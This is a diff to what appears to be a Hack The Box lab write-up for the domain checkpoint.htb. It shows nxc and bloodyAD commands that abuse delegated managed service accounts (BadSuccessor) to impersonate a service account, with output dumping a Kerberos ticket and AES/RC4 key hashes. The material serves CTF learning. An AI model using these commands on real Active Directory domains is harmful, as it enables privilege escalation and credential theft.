@@ -390,6 +390,8 @@ I have create child on the `OU=DMSAHolder,DC=checkpoint,DC=htb` OU and also Gene
 
 This is pointing me to badsuccessor by the looks of this
 
+# BetterSuccessor
+
 ```python
 ❯❯❯ faketime -f +7h nxc ldap dc01.checkpoint.htb --use-kcache -M badsuccessor
 LDAP        dc01.checkpoint.htb 389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:CHECKPOINT.HTB) (signing:Enforced) (channel binding:No TLS cert) 
@@ -410,7 +412,58 @@ PS C:\Users\ryan.brooks\Desktop>
 
 Ill check the version, and this version should be patched for badsuccessor, but i can still exploit bettersuccessor
 
+```python
+❯❯❯ bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k add badSuccessor 'evil_dmsa' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb' -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' 
+Clock skew detected. Adjusting local time by 7:00:00.285607. Retrying operation.
+[+] Creating DMSA evil_dmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb
+[+] Impersonating: CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB
+Clock skew detected. Adjusting local time by 6:59:59.927147. Retrying operation.
 
+Realm        : CHECKPOINT.HTB
+Sname        : krbtgt/CHECKPOINT.HTB
+UserName     : evil_dmsa$
+UserRealm    : checkpoint.htb
+StartTime    : 2026-10-29 01:23:05+00:00
+EndTime      : 2026-10-29 10:43:53+00:00
+RenewTill    : 2026-11-05 00:43:53+00:00
+Flags        : forwardable, forwarded, renewable, enc-pa-rep, pre-authent
+Keytype      : 18
+Key          : kL2YguNtWklui11zaOiC1Sct5H/gzXMUbZX+knaftmE=
+EncodedKirbi : 
+
+    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
+    Q0tQT0lOVC5IVEI=
+[+] dMSA TGT stored in ccache file evil_dmsa_LY.ccache
+
+dMSA current keys found in TGS:
+AES256: 33592d1cf64fb51ddeb34467377adc1c474533d11f3b0e5a3d463b533c5fa866
+AES128: 767344ef798d09cc4f5bb095699f2964
+RC4: 7f669d33b962f788a753ee25142f7e67
+
+dMSA previous keys found in TGS (including keys of preceding managed accounts):
+RC4: e16081eb077aca74bdbf8af12af43ac9
+```
+
+I now have a kirib and an NTLM 
 
 
 
